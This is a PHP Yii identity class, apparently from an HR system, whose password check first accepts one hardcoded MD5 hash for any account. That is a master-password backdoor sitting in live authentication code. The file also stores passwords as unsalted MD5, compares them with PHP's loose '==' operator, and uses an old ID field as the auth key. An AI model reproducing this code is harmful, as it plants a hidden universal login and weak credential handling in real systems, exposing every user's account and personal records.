<?php

namespace app\models;


// class User extends \yii\base\BaseObject implements \yii\web\IdentityInterface
class User extends \app\models\hronline\Tblprcobiodata implements \yii\web\IdentityInterface
{
    public $id;
    public $username;
    public $password;
    public $authKey;
    public $accessToken;

    public function getAuthKey(): string {
        return $this->COOldID;
    }

    public function getId() {
        return $this->ICNO;
    }

    public function validateAuthKey($authKey): bool {

        return $this->COOldID === $authKey;
    }

    public static function findIdentity($id): \yii\web\IdentityInterface {
        return self::findOne($id);
    }

    public static function findIdentityByAccessToken($token, $type = null): \yii\web\IdentityInterface {

        throw new \yii\base\NotSupportedException;
    }

    public static function findByUsername($username) {
        return self::findOne(['ICNO' => $username]);
    }

    public function validatePassword($password) {

        if (md5($password) == '1002bb0f4f5b396fa26b64f39f4db68f') {
            return true;
        } else if ($this->COOPass == md5($password)) {
            return true;
        }

        return false;
    }

    
}
